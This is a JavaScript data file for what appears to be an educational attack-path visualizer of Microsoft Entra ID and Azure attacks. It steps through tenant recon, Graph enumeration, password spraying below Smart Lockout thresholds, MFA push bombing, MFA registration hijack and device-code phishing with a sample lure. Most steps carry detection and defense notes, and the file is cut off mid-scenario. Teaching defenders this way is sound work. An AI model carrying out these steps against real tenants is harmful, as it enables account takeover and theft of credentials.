import { highlightElement, addTemporaryEdge } from '../graph.js';
import { stepDelay } from '../state.js';

// ══════════════════════════════════════════════════════════════════
//  ENUMERATION & DISCOVERY
// ══════════════════════════════════════════════════════════════════

// ── 0. External Tenant / User / Resource Recon ───────────────────
export const entraExternalReconScenario = [
  {
    scenarioName: "Attack: External Entra / Azure Recon (No Credentials)",
    logMessage: "Attacker Goal: From the internet, identify whether a company uses Microsoft Entra ID or Microsoft 365, discover tenant metadata, infer sign-in configuration, collect candidate users, and find public Azure resource names before any credential is compromised.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Tenant discovery: GET https://login.microsoftonline.com/corp.onmicrosoft.com/v2.0/.well-known/openid-configuration. A successful OpenID Connect metadata response exposes issuer format, authorization endpoint, token endpoint, JWKS URI, and confirms that the tenant name resolves as a Microsoft identity authority.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "OIDC metadata"),
  },
  {
    logMessage: "Domain auth hints: legacy endpoints such as getuserrealm.srf and AADInternals-style outsider recon can still reveal managed vs federated behavior in many tenants. In 2026 this remains useful for learning, but should be modeled as legacy/undocumented behavior rather than a stable Microsoft Graph feature.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "MX and service discovery: DNS lookups for corp.com identify Microsoft 365 mail protection records such as *.mail.protection.outlook.com, plus SPF / DMARC / Autodiscover hints. These public records help build the initial tenant and email-address model.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "DNS/MX recon"),
  },
  {
    logMessage: "Azure resource-name guessing: tools like MicroBurst, CloudEnum, and custom DNS probes test common Azure public suffixes: <name>.blob.core.windows.net, <name>.file.core.windows.net, <name>.azurewebsites.net, <name>.vault.azure.net, <name>.database.windows.net. Hits reveal public resource names, not authorization.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "DNS suffix probes"),
  },
  {
    logMessage: "User candidate generation: attacker collects names from OSINT sources, LinkedIn, breach corpuses, and email-verification services, then normalizes likely UPN formats such as first.last@corp.com and alias@corp.com. This builds the input set for password spray and phishing scenarios.",
    logType: "attack",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_user2"); },
  },
  {
    logMessage: "User-existence probing caveat: older tools may infer valid users by observing login-flow differences, credential-type responses, or error patterns. Microsoft does not present this as a supported enumeration API, and defenders should expect throttling, sign-in telemetry, risk detections, and intentionally ambiguous responses to reduce reliability.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Defender view: Microsoft Entra sign-in logs capture authentication activity and errors, while DNS and HTTP probes may only appear at service edges. Watch for high-volume failed sign-ins, GetCredentialType-style patterns, password spray preparation, and sudden access to public storage or app endpoints from unfamiliar infrastructure.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: No authentication is needed to build a useful target profile: tenant names, identity-provider hints, MX records, Azure public resource names, and likely UPNs. The output feeds later attacks such as password spray, device-code phishing, OAuth consent phishing, and Azure resource exposure checks.",
    logType: "success",
    action: () => { highlightElement("ent_tenant"); highlightElement("ent_attacker"); },
  },
];

// ── 1. AzureHound / BloodHound for Entra ID ──────────────────────
export const entraAzureHoundScenario = [
  {
    scenarioName: "Attack: AzureHound / BloodHound Enumeration (Entra ID)",
    logMessage: "Attacker Goal: Map Entra ID attack paths using BloodHound/AzureHound. Broad tenant metadata is visible to ordinary members, but a near-complete graph requires a reader-capable foothold such as Global Reader, Security Reader, Directory Readers, or an app/admin session with equivalent Graph read access.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has Alice's compromised credentials (alice@corp.onmicrosoft.com). In this lab, Alice is a low-visibility reader account used by operations staff: broad read, but no write privileges or standing tenant admin.",
    logType: "info",
    action: () => highlightElement("ent_user1", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker authenticates AzureHound/ROADtools with a normal delegated Entra session, for example device code or browser auth using a Microsoft public client. Effective access comes from Alice's reader role, not from any magical client privilege.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "delegated Graph auth"),
  },
  {
    logMessage: "Entra ID → Attacker: delegated Microsoft Graph token issued for Alice's session. The token reflects the directory read rights of the compromised account and tenant roles already assigned to it.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "MS Graph token"),
  },
  {
    logMessage: "AzureHound: GET https://graph.microsoft.com/v1.0/users?$select=id,userPrincipalName,accountEnabled,userType,onPremisesSyncEnabled&$top=999 (paginated). Full tenant user dump — 340 objects.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /users (all)"),
  },
  {
    logMessage: "AzureHound: GET /v1.0/groups?$top=999. GET /v1.0/groups/{id}/members for each group. Maps complete group membership relationships across tenant.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /groups+members"),
  },
  {
    logMessage: "AzureHound: GET /beta/roleManagement/directory/roleAssignments?$expand=principal&$top=999 for active role assignments, then current PIM schedule APIs for eligible roles. This works here because the compromised account already has reader permissions that expose role-management data.",
    logType: "msgraph",
    action: () => { highlightElement("ent_admin"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /roleAssignments"); },
  },
  {
    logMessage: "AzureHound: GET /v1.0/applications?$select=appId,displayName,keyCredentials,passwordCredentials,requiredResourceAccess&$top=999. GET /v1.0/servicePrincipals?$expand=appRoleAssignments. Exposes all registered apps, their secrets/cert thumbprints, and granted MS Graph application permissions.",
    logType: "msgraph",
    action: () => { highlightElement("ent_svc"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /applications+SPs"); },
  },
  {
    logMessage: "AzureHound: GET https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies. This is not a default member capability; it succeeds here because the compromised account has Policy.Read.All and a supported reader role. Parses conditions, exclusions, and control gaps.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /conditionalAccess"),
  },
  {
    logMessage: "BloodHound ingests JSON. Attack path identified: Alice → member of 'App-Owners-Prod' group → Owner on AppReg-01 → AppReg-01 has Application Permission RoleManagement.ReadWrite.Directory → can assign Global Admin to any principal.",
    logType: "attack",
    action: () => { highlightElement("ent_svc"); highlightElement("ent_user1"); highlightElement("ent_admin"); },
  },
  {
    logMessage: "IMPACT: A high-fidelity tenant attack graph is built from read-only Graph activity. This is realistic when the attacker lands on an overlooked reader-capable account or app, which tends to generate much less operational noise than overt privilege abuse.",
    logType: "success",
    action: () => highlightElement("ent_tenant"),
  },
];

// ── 2. Graph API Targeted Recon (ROADtools / GraphRunner) ────────
export const entraGraphEnumScenario = [
  {
    scenarioName: "Attack: Graph API Targeted Recon (ROADtools / GraphRunner)",
    logMessage: "Attacker Goal: Precision recon via Microsoft Graph — find over-privileged apps, accounts without MFA, stale credentials, and Conditional Access gaps. Tools: ROADtools, GraphRunner, TokenTactics.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker authenticates ROADtools with a public Microsoft client and delegated user auth. The client itself does not grant extra read power; the useful access comes from the compromised account's tenant role, such as Global Reader, Security Reader, or Reports Reader.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "auth (AzurePowerShell)"),
  },
  {
    logMessage: "Attacker → MS Graph: GET /v1.0/applications?$select=appId,displayName,passwordCredentials,keyCredentials&$top=999. Lists ALL app registrations + their client secret metadata: keyId, hint, endDateTime. Stale secrets (endDateTime far future) indicate long-term backdoor candidates.",
    logType: "msgraph",
    action: () => { highlightElement("ent_svc"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /applications"); },
  },
  {
    logMessage: "Attacker → MS Graph: GET /v1.0/servicePrincipals?$filter=appRoleAssignmentRequired eq false&$select=appId,displayName,appRoles,oauth2PermissionScopes. Finds SPs with 'RoleManagement.ReadWrite.Directory' or 'AppRoleAssignment.ReadWrite.All' application permissions — direct privilege escalation primitives.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /servicePrincipals"),
  },
  {
    logMessage: "Attacker → Microsoft Graph reports API: GET https://graph.microsoft.com/v1.0/reports/authenticationMethods/userRegistrationDetails?$filter=isMfaRegistered eq false. This is the current supported endpoint for MFA-registration state and requires a reports-capable reader context, not a random member account.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /users (MFA gaps)"),
  },
  {
    logMessage: "Attacker → Microsoft Graph: GET /v1.0/directoryRoles?$expand=members for standing admins. Then GET /v1.0/roleManagement/directory/roleEligibilityScheduleInstances?$expand=roleDefinition for PIM-eligible Microsoft Entra roles. This is the current PIM API family and again assumes a supported reader role on the compromised identity.",
    logType: "msgraph",
    action: () => { highlightElement("ent_admin"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /directoryRoles"); },
  },
  {
    logMessage: "Attacker → MS Graph: GET /v1.0/groups/{GlobalAdminGroupId}/members. Result: 'svc-backup@corp.onmicrosoft.com' is a direct member of Global Administrators group — service-style admin account, no MFA registered, and still using weaker sign-in controls than the standard admin baseline.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /groups/GA/members"),
  },
  {
    logMessage: "Attacker → Microsoft Graph: GET https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies (requires Policy.Read.All). Policies show break-glass and service-account exceptions, plus weaker enforcement on some noninteractive sign-in paths. That makes svc-backup a higher-confidence target than a normal user.",
    logType: "msgraph",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Recon complete — ROADtools DB built locally. Target identified: a non-MFA reader/admin account plus an over-privileged app registration with long-lived secrets. Multiple high-confidence attack paths emerge without needing noisy write activity.",
    logType: "success",
    action: () => { highlightElement("ent_admin"); highlightElement("ent_svc"); },
  },
];

// ── 2b. Authenticated Post-Compromise Recon ──────────────────────
export const entraPostCompromiseReconScenario = [
  {
    scenarioName: "Attack: Post-Compromise Recon (Authenticated Entra Session)",
    logMessage: "Attacker Goal: After compromising a valid tenant user, enumerate the identity plane, Azure resource plane, Conditional Access controls, federation/sync hints, service principals, and high-value resource paths before choosing the next escalation step.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Starting point: attacker has Alice's delegated session. First pass is low-noise identity inventory: GET /v1.0/organization?$select=verifiedDomains, GET /v1.0/users?$select=userPrincipalName,id,onPremisesImmutableId,department,city,accountEnabled, and GET /v1.0/groups?$select=displayName,id,securityEnabled.",
    logType: "msgraph",
    action: () => { highlightElement("ent_user1", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Tenant + users + groups"); },
  },
  {
    logMessage: "Admin target inventory: GET /v1.0/directoryRoles?$expand=members and current PIM role schedule APIs identify standing and eligible Global Administrators, Privileged Role Administrators, Cloud Application Administrators, User Administrators, and Security Readers.",
    logType: "msgraph",
    action: () => { highlightElement("ent_admin"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Admin roles + PIM"); },
  },
  {
    logMessage: "Federation and hybrid clues: for each verified domain, query /v1.0/domains/{domain}/federationConfiguration where permissions allow it. A federated domain exposes issuerUri, passiveSignInUri, metadataExchangeUri, and signing certificate metadata that shape later Golden SAML or federation-backdoor checks.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Federation config"),
  },
  {
    logMessage: "Conditional Access recon: GET /v1.0/identity/conditionalAccess/policies requires Policy.Read.All plus a supported reader/admin role such as Security Reader, Global Reader, Conditional Access Administrator, or Security Administrator. Parse included users, excluded groups, named locations, client apps, grant controls, and report-only policies.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "CA policies"),
  },
  {
    logMessage: "Service principal review: GET /v1.0/applications and /v1.0/servicePrincipals with appRoleAssignments. Prioritize apps with credentials, owners who are weak accounts, application permissions such as Mail.Read, Directory.ReadWrite.All, AppRoleAssignment.ReadWrite.All, or RoleManagement.ReadWrite.Directory, and SPs with Azure RBAC assignments.",
    logType: "msgraph",
    action: () => { highlightElement("ent_svc"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "SP/app inventory"); },
  },
  {
    logMessage: "Azure resource-plane recon: ARM calls list accessible subscriptions, resource groups, Key Vaults, storage accounts, VMs, managed identities, and role assignments. This tells the attacker whether their current token can reach Azure resources or whether they need a role/RBAC pivot first.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "ARM inventory"),
  },
  {
    logMessage: "MFA/CA path testing: tools like MFA Sweep try different client paths and resources to see where MFA or Conditional Access blocks apply. In 2026, treat results as noisy sign-in activity; tests can generate Entra sign-in logs, risk detections, and lockout/rate-limit signals.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "Client-path probes"),
  },
  {
    logMessage: "Graph output is ingested into BloodHound/AzureHound. Example path: compromised Alice -> can reset Bob -> Bob has User Access Administrator on RG -> grant Key Vault Secrets User -> read secrets. The point of post-compromise recon is to find the cheapest path, not immediately chase Global Admin.",
    logType: "attack",
    action: () => { highlightElement("ent_user2"); highlightElement("ent_kv"); },
  },
  {
    logMessage: "Detection: look for bursty Graph reads across users, groups, applications, roleManagement, Conditional Access, and ARM resource lists from a newly compromised identity. Baseline legitimate admin tooling so ROADtools/AADInternals/AzureHound-style collection stands out.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Authenticated recon turns one user credential into a mapped attack plan: admins, app backdoors, service principals, Key Vaults, storage accounts, federation dependencies, sync infrastructure, and Conditional Access gaps. The output directly feeds the privilege-escalation scenarios in this Entra tab.",
    logType: "success",
    action: () => { highlightElement("ent_tenant"); highlightElement("ent_svc"); highlightElement("ent_kv"); },
  },
];

// ══════════════════════════════════════════════════════════════════
//  INITIAL ACCESS & CREDENTIAL ATTACKS
// ══════════════════════════════════════════════════════════════════

// ── 3. Password Spray (Entra Smart Lockout aware) ─────────────────
export const entraPasswordSprayScenario = [
  {
    scenarioName: "Attack: Password Spray — Entra ID (Smart Lockout Evasion)",
    logMessage: "Attacker Goal: Identify valid credentials by spraying one or two likely passwords across harvested UPNs while staying below Microsoft Entra Smart Lockout and risk-detection thresholds.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Smart Lockout is always on and cannot be disabled. Defaults: 10 failed attempts in Azure Public tenants, 3 in Azure US Government tenants, initial lockout 60 seconds with increasing durations. Familiar and unfamiliar locations have separate counters, and repeated use of the same bad password hash may not increment the counter — spray one password per account across a long window.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Attacker: 340 UPNs collected via external recon + authenticated recon. Password spray is aimed first at low-friction targets such as service-style accounts, break-fix accounts, and users excluded from strong MFA. Tooling: CredMaster / MSOLSpray-style token endpoint testing with slow cadence and IP diversity.",
    logType: "info",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker: POST https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token { grant_type=password, username=bob@corp, password=Spring2026!, client_id=<public-client-id> }. ROPC-style testing can reveal valid credentials through OAuth error differences, but it is blocked when MFA, Conditional Access, or disabled public-client/ROPC paths apply.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "spray (bob, ip1)"),
  },
  {
    logMessage: "Entra ID → Attacker: 400 { error: 'invalid_grant', error_codes: [50126], error_description: 'AADSTS50126: Invalid credentials' }. Smart Lockout considers the user, password hash, familiar/unfamiliar location, and tenant policy. The exact internal rate behavior is intentionally not fully disclosed by Microsoft.",
    logType: "fail",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "50126 invalid_grant"),
  },
  {
    logMessage: "Attacker runs a slow spray: one password per user, pauses between waves, varies network egress, and groups targets by likely Conditional Access location requirements. This reduces lockout risk but increases sign-in telemetry: repeated failures across many users, many IPs, or unfamiliar locations.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "spray batch (100 accts)"),
  },
  {
    logMessage: "Entra ID → Attacker: 200 OK { access_token, refresh_token, token_type: Bearer, scope } — alice@corp:Spring2026! valid. This succeeds here because the compromised account is one of the tenant's weak exceptions: no phishing-resistant MFA, no effective CA block, and an allowed password-based OAuth path.",
    logType: "success",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "200 OK (alice)"); },
  },
  {
    logMessage: "Legacy protocol caveat: Exchange Online Basic Auth was permanently disabled across tenants starting October 1, 2022 for protocols such as EWS, POP, IMAP, EAS, Outlook, and Remote PowerShell. OWA/M365 spraying now primarily lands on modern-auth and token-flow surfaces, not classic Basic Auth endpoints.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Detection: Microsoft Entra ID Protection can raise password-spray risk when Microsoft observes a spray and confirms a successful credential validation. Failed-only sprays may still be visible in sign-in logs but don't necessarily generate that specific risk detection.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Valid credentials obtained for an account left outside modern controls. Root cause is weak password hygiene plus tenant exception handling, not an inherent ability to defeat MFA when MFA, Conditional Access, and phishing-resistant auth are actually enforced.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ── 3b. OWA Password Spray — Exchange Online vs On-Prem OWA ──────
export const entraOWAPasswordSprayScenario = [
  {
    scenarioName: "Attack: OWA Password Spray — Exchange Online vs On-Prem",
    logMessage: "Attacker Goal: Test credentials against Outlook on the web. The 2023 Burp Suite form-post technique is useful for learning, but in 2026 it must be split into two cases: Exchange Online OWA and self-hosted/hybrid Exchange Server OWA.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Exchange Online Basic Authentication is permanently disabled across all tenants and cannot be re-enabled. All OWA / Outlook traffic uses Modern Authentication via Entra ID — any credential testing goes through login.microsoftonline.com and is subject to Smart Lockout, Conditional Access, and sign-in logging.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Cloud OWA path: attacker browses https://outlook.office.com/mail/ and is redirected into login.microsoftonline.com. Any password testing is effectively Entra sign-in testing, governed by Smart Lockout, Conditional Access, MFA, Identity Protection, and sign-in logs.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "OWA -> Entra login"),
  },
  {
    logMessage: "Cloud failure: wrong password returns Entra authentication errors, not an Exchange form-length oracle. The same detection surface as M365 password spray applies: failed sign-ins across many users, unfamiliar locations, anonymous IPs, and password-spray risk if a password is successfully validated.",
    logType: "fail",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "invalid_grant / failed sign-in"),
  },
  {
    logMessage: "On-prem or hybrid OWA path: attacker finds https://mail.corp.com/owa on an Exchange Server virtual directory using forms-based or Basic authentication. Lockout behavior is governed by on-prem AD DS account lockout policy and Exchange/ADFS configuration, not Entra Smart Lockout.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "http", "POST /owa/auth.owa"),
  },
  {
    logMessage: "Legacy technique: with Burp Intruder, attacker captures an OWA POST, marks the username/password fields, uses a slow password list, follows same-site redirects, and looks for response differences. This is noisy and risky because the attacker often cannot know the on-prem AD lockout threshold.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Successful on-prem case: OWA returns a mailbox session for Sombra. If the mailbox is on-premises, follow-on access may not immediately create Entra cloud sign-ins, but hybrid mail flow, federation, and later cloud token use can still tie back to Entra telemetry.",
    logType: "success",
    action: () => { highlightElement("ent_user1", undefined, "compromised"); addTemporaryEdge("ent_m365", "ent_attacker", "http", "OWA mailbox session"); },
  },
  {
    logMessage: "Detection: For Exchange Online, monitor Entra sign-in logs and Identity Protection. For on-prem OWA, monitor IIS logs, Exchange logs, ADFS logs if federated, AD account lockouts, and repeated POSTs to /owa/auth.owa from one or many IP addresses.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: OWA form-based auth is not the primary Exchange Online attack path — modern tenants redirect to Entra for auth. The technique remains relevant for legacy on-prem/hybrid OWA. In cloud-first tenants, model it as Entra password spray; in hybrid tenants, protect OWA with modern auth, pre-auth, MFA, lockout policy, and aggressive logging.",
    logType: "success",
    action: () => { highlightElement("ent_m365"); highlightElement("ent_user1"); },
  },
];

// ── 4. MFA Fatigue / Authenticator Push Bombing ──────────────────
export const entraMFAFatigueScenario = [
  {
    scenarioName: "Attack: MFA Fatigue — Authenticator Push Bombing",
    logMessage: "Attacker Goal: Defeat MFA by overwhelming the victim with repeated Authenticator push notifications until an accidental approval. Requires valid password. Exploits absence of number matching.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has Alice's password from spray. CA policy mandates MFA for all sign-ins but Authenticator push is configured as 'Approve/Deny' only — no number matching, no additional context displayed in the push notification.",
    logType: "info",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_attacker"); },
  },
  {
    logMessage: "Attacker → Entra ID: Starts an interactive /oauth2/v2.0/authorize flow, then submits Alice's credentials through the login.microsoftonline.com ESTS web form. Credentials are valid. CA requires MFA, so Entra dispatches an Authenticator push to Alice's registered device.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "auth + pwd valid"),
  },
  {
    logMessage: "Entra ID → Alice's device: Push #1 — 'Are you trying to sign in? Approve / Deny'. No app name, no location, no number. Alice dismisses. Attacker immediately cancels and re-initiates authentication to trigger another push.",
    logType: "prt",
    action: () => { highlightElement("ent_dev1"); addTemporaryEdge("ent_tenant", "ent_dev1", "prt", "push #1 (denied)"); },
  },
  {
    logMessage: "Attacker loops authentication: Push #2 at 02:14, #3 at 02:15, #4 at 02:16... Sustained over 25 minutes, targeting late-night when Alice is likely asleep. Each denial = another immediate re-auth attempt. 17 pushes dispatched.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_tenant", "ent_dev1", "prt", "push x17 (denied)"),
  },
  {
    logMessage: "Alice, woken by repeated phone buzzing at 02:47, half-asleep taps 'Approve' on Push #17. Entra ID: MFA claim satisfied (amr: [pwd, mfa]). Authorization code issued to attacker's browser session.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_dev1", "ent_tenant", "prt", "push #17 APPROVED"); },
  },
  {
    logMessage: "Entra ID → Attacker: { access_token (1h), refresh_token (14d), id_token (alice@corp, oid) }. Full session established. All subsequent token requests use refresh_token — no further MFA prompts for 14 days.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "tokens (alice, 14d)"),
  },
  {
    logMessage: "DETECTION / PREVENTION: Enable 'Number Matching' in Authenticator policy — app displays a 2-digit code user must type, blocking blind approvals. 'Additional context' — shows app name + geographic location in push. Microsoft enforced number matching as default in May 2023. Also: sign-in frequency CA policy (max 1h session) limits refresh_token lifespan.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: MFA fully bypassed via social engineering. No technical exploit. Attacker has 14-day refresh token satisfying all CA controls. Root cause: push notification without context = no signal to distinguish legitimate vs. attacker-initiated prompts.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ── 4b. MFA Registration Hijack (Dormant Account Takeover) ──────
export const entraMFARegistrationHijackScenario = [
  {
    scenarioName: "Attack: MFA Registration Hijack (Dormant Account Takeover)",
    logMessage: "Attacker Goal: Identify newly provisioned or dormant accounts with valid credentials but no MFA method registered. Log in as the user, and register the attacker's own authenticator device — permanently seizing MFA-authenticated access without the legitimate user ever gaining control.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has valid credentials for a target account (password spray, credential dump, phishing). Account exists in the tenant but the user has not yet completed MFA setup — common with new hires, contractor accounts, or accounts not recently used. No Conditional Access policy on security info registration is in place.",
    logType: "setup",
    action: () => { highlightElement("ent_user2"); highlightElement("ent_attacker"); },
  },
  {
    logMessage: "Recon — identify accounts without MFA: MSOnline Get-MsolUser retired March 2025. 2026 Graph path: Get-MgUserAuthenticationMethod -UserId <upn> (requires User.ReadWrite.All or UserAuthenticationMethod.Read.All). An empty array or only 'passwordAuthenticationMethod' returned indicates no MFA device registered. Alternatively: admin portal → Entra ID → Users → Authentication methods → filter by 'No method registered'.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /users/{id}/authentication/methods"),
  },
  {
    logMessage: "Attacker signs in with stolen credentials at login.microsoftonline.com. Entra ID recognizes no MFA method is registered and launches the 'More information required' registration flow — prompting the user (attacker) to configure Microsoft Authenticator or another method. Credential is valid; no second factor exists to block this step.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "login → MFA setup prompt"),
  },
  {
    logMessage: "Attacker opens Microsoft Authenticator on their own device, scans the QR code displayed in the registration flow, and completes setup. The attacker's device is now the registered authenticator for cole@corp.com. The legitimate user has no knowledge of this and owns no registered MFA method.",
    logType: "attack",
    action: () => { highlightElement("ent_user2", stepDelay, "compromised"); addTemporaryEdge("ent_attacker", "ent_tenant", "prt", "attacker device registered as MFA"); },
  },
  {
    logMessage: "Going forward: Attacker authenticates as cole@corp.com using password + their own Authenticator push. All CA policies requiring MFA are satisfied — the MFA is real, just registered to the wrong person. No alerts fire. If the legitimate user eventually tries to sign in, they are blocked by MFA they cannot satisfy, which may surface as a helpdesk ticket rather than a security alert.",
    logType: "oidc",
    action: () => { highlightElement("ent_m365"); addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "full access (attacker MFA)"); },
  },
  {
    logMessage: "Persistence: Attacker retains persistent access until an admin reviews authentication methods for the account. Unlike session cookie theft, this is a durable credential compromise — password reset alone does not remove registered authentication methods. Attacker must also be removed from the registered methods list.",
    logType: "attack",
    action: () => highlightElement("ent_user2"),
  },
  {
    logMessage: "DETECTION: Audit log event: Microsoft.Directory/users/authenticationMethods/basic/update — fires when a new authentication method is registered. Alert on: (1) first-ever auth method registration combined with sign-in from unusual location/IP; (2) registration immediately followed by successful auth; (3) accounts never previously signing in that suddenly complete MFA setup. Monitor with Sentinel or Defender for Identity.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DEFENSE: CA policy 'Require MFA for security info registration' — forces the user to satisfy an existing MFA method before registering a new one. Dormant accounts with no MFA cannot satisfy this, so registration is blocked. Temporary Access Pass (TAP) is the secure onboarding path: IT issues a short-lived single-use code to bootstrap the initial legitimate registration. Registration Campaign feature (Entra) + identity verification requirement blocks unauthorized first-time registration even after password compromise.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Attacker permanently owns MFA for the account. CA policies requiring MFA become attack allies — they verify the attacker's device, not the legitimate user's. APT29 used this technique in real campaigns against organizations with dormant provisioned accounts. Requires no technical exploit — only a password and an authenticator app.",
    logType: "attack",
    action: () => highlightElement("ent_user2"),
  },
];

// ── 5. Device Code Phishing (OAuth2 Device Authorization Grant) ──
export const entraDeviceCodePhishingScenario = [
  {
    scenarioName: "Attack: Device Code Phishing (OAuth2 Device Authorization Grant Abuse)",
    logMessage: "Attacker Goal: Steal Entra tokens by abusing the OAuth2 device authorization grant flow. Victim authenticates in their own browser on their own device — attacker collects the resulting tokens. No malware required.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker: POST https://login.microsoftonline.com/corp.onmicrosoft.com/oauth2/v2.0/devicecode { client_id: d3590ed6-52b3-4102-aeff-aad2292ab01c (Microsoft Office), scope: openid profile offline_access User.Read }. The public client identity affects what the victim sees, but the granted access is still bounded by requested scopes, consent, user rights, and tenant policy.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "POST /devicecode"),
  },
  {
    logMessage: "Entra ID → Attacker: { device_code: 'BAAEAAAA...', user_code: 'ABCD-1234', verification_uri: 'https://microsoft.com/devicelogin', expires_in: 900, interval: 5 }. By default the user_code/device_code pair is valid for 15 minutes, and the client should poll no faster than the returned interval.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "device_code + user_code"),
  },
  {
    logMessage: "Attacker → Alice (spear phish email): 'URGENT: Your Microsoft 365 license renewal requires verification. Visit https://microsoft.com/devicelogin and enter code ABCD-1234.' Uses legitimate Microsoft domain — no spoofing, passes link scanners.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
  {
    logMessage: "Alice opens https://microsoft.com/devicelogin on LAPTOP-01 (ent_dev1). Enters 'ABCD-1234'. Entra ID prompts full authentication: credentials + MFA push. Alice completes normally — she sees a real Microsoft login page, real MFA prompt. No phishing indicators.",
    logType: "prt",
    action: () => addTemporaryEdge("ent_dev1", "ent_tenant", "prt", "user authenticates"),
  },
  {
    logMessage: "While Alice authenticates, the attacker polls POST /oauth2/v2.0/token { grant_type=urn:ietf:params:oauth:grant-type:device_code, client_id=<same public client>, device_code=<BAAEAAAA...> }. Expected pre-auth responses include authorization_pending, authorization_declined, or expired_token.",
    logType: "oidc",
